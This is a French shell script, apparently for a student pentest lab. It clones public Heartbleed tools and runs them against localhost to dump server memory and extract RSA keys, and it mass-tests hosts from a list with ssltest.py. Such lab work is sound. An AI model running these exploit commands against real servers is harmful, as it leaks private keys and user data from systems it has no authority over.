### Mise en place du serveur pentest :

cd /home/etudiant
git clone https://github.com/amineAUPEC/heartbleed-automation.git
cd heartbleed-automation
cd bash

# étape optionnel :
#### Injecter de la donnée / stimuler le serveur cible 

# Installation des prérequis et des outils
ip="127.0.0.1"
sudo apt-get update -y && sudo apt-get install -y git 
sudo apt-get update -y && sudo apt-get install -y python
cd /home/etudiant
git clone https://github.com/injcristianrojas/heartbleed-example.git
cd heartbleed-example
chmod +x stimulate_server.py


# -  HEARTBLEED : *Dump la RAM*
    # - script heartbleed.py
cd /home/etudiant/heartbleed-example
chmod +x heartbleed.py


# - Paquetage linux heartbleeder : *Check*

sudo apt-get update -y && sudo apt-get install -y heartbleeder && sudo apt-get autoremove -y


# -  Usage du script ssltest.py : *Check*
cd /home/etudiant
git clone https://github.com/tdussa/heartbleed-masstest.git
cd heartbleed-masstest
cp /home/etudiant/heartbleed-automation/conffiles/hostlist.txt . && chmod +x ssltest.py
# nano hostlist.txt && chmod +x ssltest.py

# - tester via openssl_client *Check and dump*
# - mais au préalable
    # - mise en place du serveur vulnérable depuis le serveur docker ou un autre serveur
    # générer un certificat dans /etc/ssl/private/apache-selfsigned.key -cert /etc/ssl/certs/apache-selfsigned.crt


# # injecte de la donnée auprès du serveur en continu
# sudo sed -E -i 's/CipherString = DEFAULT@SECLEVEL=2/CipherString = DEFAULT@SECLEVEL=1/' /etc/ssl/openssl.cnf
# cd /home/etudiant/heartbleed-example
# python stimulate_server.py -a $ip &

###### On lance les outils
# -  HEARTBLEED : *Dump la RAM*
    # - script heartbleed.py
cd /home/etudiant/heartbleed-example
# python heartbleed.py $ip -p 443
python heartbleed.py $ip -p 443 -v -n 50

    # -  HEARTBLEED : *Dump la RAM* partie RSA
cd /home/etudiant/heartbleed-example
sudo apt-get install -y python-pip libgmp-dev && sudo pip install gmpy pyasn1
sudo python heartbleed.py $ip -p 443 -e


# - Paquetage linux heartbleeder : *Check*
cd /home/etudiant/heartbleed-example
heartbleeder $ip:443


# -  Usage du script ssltest.py : *Check*
cd /home/etudiant/heartbleed-masstest
./ssltest.py --ports "443, 993, 995, 44330" hostlist.txt

# - tester via openssl_client *Check and dump*
openssl s_client -connect $ip:443 -tlsextdebug | grep "TLS server extension"
# openssl s_client -connect $ip:44330 -tlsextdebug | grep "TLS server extension"


